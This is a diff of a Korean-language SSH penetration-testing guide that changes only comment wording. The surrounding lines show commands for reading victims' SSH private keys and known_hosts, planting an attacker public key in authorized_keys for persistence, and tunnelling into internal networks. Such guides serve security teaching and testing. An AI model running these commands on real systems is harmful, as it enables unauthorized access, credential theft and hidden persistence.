@@ -69,7 +69,7 @@ cat /home/user/.ssh/id_rsa
 # authorized_keys 확인 (다른 신뢰 관계)
 cat /home/*/.ssh/authorized_keys
 
-# known_hosts에서 타겟 도출
+# known_hosts에서 target 도출
 cat /home/*/.ssh/known_hosts
 ```
 
@@ -106,7 +106,7 @@ AllowUsers / AllowGroups     # 허용 사용자/그룹
 # 공격자 키 생성
 ssh-keygen -t ed25519 -f attacker_key -N ''
 
-# 타겟에 공개키 추가
+# target에 공개키 추가
 echo "ATTACKER_PUBKEY" >> /home/user/.ssh/authorized_keys
 chmod 600 /home/user/.ssh/authorized_keys
 
@@ -119,12 +119,12 @@ ssh -i attacker_key user@TARGET
 ## SSH 터널링
 
 ```bash
-# Local Port Forwarding (타겟 내부 포트를 로컬로)
+# Local Port Forwarding (target 내부 포트를 로컬로)
 ssh -L LOCAL_PORT:INTERNAL_TARGET:REMOTE_PORT user@TARGET
-# 예: 타겟 뒤의 내부 웹서버 접근
+# 예: target 뒤의 내부 웹서버 접근
 ssh -L 8080:10.0.0.5:80 user@TARGET
 
-# Remote Port Forwarding (로컬 포트를 타겟으로)
+# Remote Port Forwarding (로컬 포트를 target으로)
 ssh -R REMOTE_PORT:LOCAL_TARGET:LOCAL_PORT user@TARGET
 
 # Dynamic Port Forwarding (SOCKS 프록시)
